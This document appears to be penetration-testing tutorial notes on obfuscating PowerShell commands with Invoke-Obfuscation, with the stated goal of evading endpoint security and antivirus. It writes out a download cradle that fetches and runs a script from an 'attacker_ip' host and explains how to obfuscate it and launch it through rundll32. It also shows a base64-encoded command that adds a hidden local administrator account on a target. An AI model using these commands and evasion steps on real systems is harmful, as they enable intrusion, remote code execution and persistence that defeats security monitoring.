


# Obfuscation

As endpoint security solutions catch up with attacker methods and implement heuristics and detection
signatures to catch PowerShell commands as they're being executed, we turn to obfuscation as a layer in
helping us evade those defenses


One of the more well-known frameworks we can use for this purpose is Daniel Bohannon's Invoke-Obfuscation

https://github.com/danielbohannon/Invoke-Obfuscation/archive/master.zip



# Invoke-Obfuscation Framework Notes/Usage


Invoke-Obfuscation offers us some excellent options we can use to obfuscate and encode our PowerShell
commands or script blocks using a number of methods including AES encryption with the "SecureString" 
method, to special characters and even whitespace encoding

We'll first need to download the Invoke-Obfuscation framework into our modules directory from the link
above, same as we did for the PowerSploit example in the Fundamentals section

We can find a modules path to use by executing the following from the PowerShell console:

PS C:\> $env:PSModulePath

In our case we will use the first path 

C:\users\user\Documents\WindowsPowerShell\Modules


Keep in mind the actual output will show something like this

C:\users\user\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:WINDOWS\system32\WindowsPowerShell\v1.0\Modules

Each path is seperated by a semicolon (;)


Once we download and extract the Invoke-Obfuscation package into our modules directory in a folder called 
Invoke-Obfuscation, we should be able to import it into our current PowerShell session


PS C:\> Import-Module Invoke-Obfuscation


Once we've imported the Invoke-Obfuscation modules, we can then launch the framwork with the
Invoke-Obfuscation command, and we are then presented with several different options


We have several different options we can use to obfuscate our PowerShell commands:

TOKEN - Obfuscate PowerShell command Tokens

AST - Obfuscate PowerShell Ast nodes (PowerShell 3.0 and greater)

STRING - Obfuscate entire command as a String

ENCODING - Obfuscate entire command via Encoding

COMPRESS - Convert entire command to one-liner and Compress

LAUNCHER - Obfuscate command args w/Launcher techniques (run once at end)



For our purposes, we'll show some use cases with the String and Encoding methods

First, in order to tell Invoke-Obfuscation what we'd like to obfuscate exactly, we first need to use the
SET SCRIPTBLOCK command

As an example of a script block we can use a standard Net.WebClient download cradle

iex (New-Object Net.WebClient).downloadstring("http://attacker_ip/Get_ProcessPaths.ps1")

The download cradle, when executed on our target, will use the Net.WebClient class, and will download and
execute our "Get-ProcessPaths.ps1" script from our attacker machine, which will simply list running
processes on our target


Lets set that as the SCRIPTBLOCK in Invoke-Obfuscation as the command we want to obfuscate with the 
SET SCRIPTBLOCK command 


SET SCRIPTBLOCK iex (New-Object Net.WebClient).downloadstring("http://attacker_ip/Get-ProcessPaths.ps1")


# String Method

Once we've told Invoke-Obfuscation what we'd like to obfuscate with the SET SCRIPTBLOCK command, we can
select a method we'd like to use. Lets use the STRING method to start as an example. We simply type 
STRING and are presented with several options for that method:


Invoke-Obfuscation> STRING


We have 3 options with the STRING obfuscation method shown in our PowerShell session


STRING\1 	Concatenate entire command
STRING\2 	Reorder entire command after concatenating
STRING\3 	Reverse entire command after concatenating


Lets go with option 3, the Reverse method

The Reverse method will first concatenate our PowerShell command line and then reverse the entire string


Once we select and run the option we want, Invoke-Obfuscation presents us with the command it used to
create the obfuscated string block, along with the result of the command. The result of the command is what
we will execute on our target system

The output will show something similiar to the following


Invoke-Obfuscation> 3


Executed:
  CLI: 	String\3
  FULL: Out-ObfuscatedStringCommand -Scriptblock $ScriptBlock 3


Result: 
Our obfuscated command for execution on the target will be shown here



We can just copy and paste the result output to our target system in a PowerShell prompt, and it will
execute our download cradle



# Encoding Method


Lets look at the results of the ENCODING method, which provides a bit more obfuscation, and it is a 
bit harder to detect


Invoke-Obfuscation> ENCODING

ENCODING/1 		Encode entire command as ASCII
ENCODING/2 		Encode entire command as Hex
ENCODING/3 		Encode entire command as Octal
ENCODING/4		Encode entire command as Binary
ENCODING/5 		Encrypt entire command as SecureString (AES)
ENCODING/6 		Encode entire command as BXOR
ENCODING/7		Encode entire command as Special Characters
ENCODING/8 		Encode entire command as Whitespace


Option 7, for example is the Special Characters encoding

Running that method against our script block returns us a heavily obfuscated string


Again we simply paste the resulting output into a PowerShell console on our target machine



If we're operating from a windows command prompt on the target, we can use the powershell.exe -command
option to run our obfuscated commands, just encapsulate the result with quotes

(Example shown in folder)



Be sure to experiment with all of the obfuscation options available with Invoke-Obfuscation, there is a 
lot of great stuff in there, and much of it still bypasses most AV solutions


# Important 

Something to note while using Invoke-Obfuscation is that if you've applied a method t oa script block, and 
then re-apply another method, it will append to a previous script block, and essentially create a very large
result


You'll notice this when you try to apply a method and recieve a warning about the command exceeding
cmd.exe's maximum command length: 


WARNING: This command exceeds the cmd.exe maximum length of 8190. It's length is 137567 characters


To get around this, after applying one particular encoding method, use the RESET option to clear previous
encodings, this way, they wont "pile up" on one another




# Launcher Option



In addition to obfuscating our PowerShell commands, we can also create obfuscated launcher commands to run
our obfuscated code on the target using the LAUNCHER option. For instance, if we want to use WMIC to launch
our obfuscated code, we can quickly generate a command to do so. The available LAUNCHER options are:


LAUNCHER\PS
LAUNCHER\CMD
LAUNCHER\WMIC
LAUNCHER\RUNDLL
LAUNCHER\VAR+
LAUNCHER\STDIN+
LAUNCHER\CLIP+
LAUNCHER\VAR++
LAUNCHER\STDIN++
LAUNCHER\CLIP++
LAUNCHER\RUNDLL++
LAUNCHER\MSHTA++



The process for using the LAUNCHER option is that we first create our obfuscated commands as we did before:

1. We SET SCRIPTBLOCK with the code we want to execute

2. We select an obfuscation methos to generate the obfuscate command

3. We then use the LAUNCHER option at the end of this process


In this example, we'll assume we followed the above steps, and now select our launcher command:

We'll choose the RUNDLL method and then the command line options we'd like to use as well, in this case,
we'll choose 0 for No Execution Flags:


The resulting string, is an obfuscated command that utilizes rundll32.exe with the "SHELL32.DLL" function
(ShellExec_RunDLL) which will launch our obfuscated PowerShell code on the target



# Tutorial/Help option

Invoke-Obfuscation includes a Tutorial option if we ever get stuck and need guidance, 
just type tutorial in the PowerShell prompt




# Base64 EncodedCommand

Although its not really a recommended obfuscation method since it can be easily detected by AV and other
string heuristics, considering its just base64 encoding, PowerShell's EncodedCommand parameter can be used


The -EncodedCommand parameter allows us to execute encoded commands or script blocks which contain
characters which might interfere with the processing of our commandvia a windows command prompt

In simpler terms, it makes complex commands "digestible" for PowerShell by encoding everything with Base64


As an example, to encode a command that will add a new user "admin1" to the local administrators group
we can do the following

PS C:\> $command = `net user admin1 "p@ssw0rd9001" /ADD; net localgroup administrators admin1 /add`
PS C:\> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
PS C:\> $encodedCommand = [Convert]::ToBase64String($bytes)

We can then get the results of our encoded command with the Write-Host cmdlet against our 
$encodedCommand variable

PS C:\> Write-Host $encodedCommand
[result shown here]



We then execute our encoded command with the powershell.exe -EncodedCommand parameter on the target:


C:\WINDOWS\system32> powershell.exe -encodedcommand [paste encoded command here]